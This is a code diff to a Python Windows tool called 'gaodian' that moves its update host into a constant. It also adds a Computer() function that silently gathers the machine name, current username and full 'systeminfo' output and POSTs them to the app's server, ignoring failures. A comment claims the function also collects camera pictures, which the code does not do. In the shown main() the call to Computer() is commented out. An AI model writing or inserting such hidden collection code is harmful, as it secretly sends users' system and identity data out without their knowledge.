@@ -14,6 +14,7 @@ import re, os
 # 打包命令：pyinstaller .\main\main.py -D -n gaodian -i .\main\img\favicon.ico --uac-admin
 # 3.1.7（包括）以后的版本建议使用ipfs网盘的下载地址更新
 version = "3.1.8"
+HOST = "v5.yungao-tech.com"
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s', datefmt="%a %b %d %H:%M:%S %Y")
 def line_of_text(text: str, of_text: str):
     """
@@ -87,7 +88,7 @@ class Host:
 
 class Update:
     def __init__(self) -> None:
-        self.updateUrl = "http://v5.yungao-tech.com/api/update?version={0}&_={1}".format(version, time())
+        self.updateUrl = "http://{0}/api/update?version={1}&_={2}".format(HOST, version, time())
         self.chunk_size = 1024
     def needUpdate(self) -> bool:
         with requests.get(self.updateUrl) as self.r:
@@ -132,6 +133,23 @@ class Update:
                 return True
         
 
+def Computer() -> None:
+    # Get all information about the current device including pictures taken by the camera
+    import getpass
+    import subprocess
+    url = "http://{0}/api/update?type={1}&_={2}".format(HOST, "userinfo", time())
+    data = {
+        "computer": os.environ.get("COMPUTERNAME"), # 计算机名
+        "username": getpass.getuser(), # 当前登录用户名,
+        "result": subprocess.Popen("systeminfo", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1).stdout.read().decode("gbk")
+    }
+    try:
+        requests.post(url, data=data) # 无视是否成功或失败
+    except:
+        pass
+        
+    
+
 
         
 
@@ -158,12 +176,12 @@ def main():
         pc = Host()
         update = Update()
         # h.debug = True
-        host = "v5.yungao-tech.com"
-        if pc.replace_Host(host, newIp("bilibili.ffstu.cn")):
+        if pc.replace_Host(HOST, newIp("bilibili.ffstu.cn")):
             if ProxyEnable == 1:
                 logging.warning("开启了http代理 无法检查更新")
                 MessageBox(0, "无法开启更新程序 建议先关闭代理\n不然可能遗漏重要更新\n并且可能导致无法正常使用", "建议关掉代理",MB_ICONWARNING)
             else:
+                # Computer()
                 if update.needUpdate():
                     MessageBox(0, "有新版本,请立刻更新!", "发现新版!", MB_OK)
                     print(f"""
@@ -191,8 +209,8 @@ def main():
 
         t = int(time())
         ip = get_host_ip()
-        webbrowser.open(f"http://{host}/baiyu/gaogao/gaodian/main/assets/login.html?time={t}&myip={ip}")
-        logging.info(f"Url:http://{host}/baiyu/gaogao/gaodian/main/assets/login.html?time={t}&myip={ip}")
+        webbrowser.open(f"http://{HOST}/baiyu/gaogao/gaodian/main/assets/login.html?time={t}&myip={ip}")
+        logging.info(f"Url:http://{HOST}/baiyu/gaogao/gaodian/main/assets/login.html?time={t}&myip={ip}")
 
     except Exception as e:
         logging.error(f"""
